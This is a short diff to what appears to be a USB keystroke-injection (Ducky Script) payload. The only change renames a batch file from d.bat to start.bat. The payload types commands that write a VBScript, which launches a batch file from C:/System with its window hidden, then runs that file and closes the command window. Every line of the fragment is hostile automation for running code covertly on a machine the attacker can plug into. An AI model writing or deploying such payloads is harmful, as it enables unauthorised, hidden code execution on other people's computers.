@@ -19,7 +19,7 @@
   STRING echo Set WshShell = CreateObject('WScript.Shell') > c.vbs
   ENTER
   DELAY 100
-  STRING echo WshShell.Run chr(34) ^& C:/System/d.bat ^& Chr(34), 0 >> c.vbs
+  STRING echo WshShell.Run chr(34) ^& C:/System/start.bat ^& Chr(34), 0 >> c.vbs
   ENTER
   DELAY 50
   STRING echo Set WshShell = Nothing >>> c.vbs
@@ -30,5 +30,5 @@
   ENTER
   DELAY 75
   REM [runs start.bat and closes the command window]
-  STRING d.bat & exit
+  STRING start.bat & exit
   ENTER
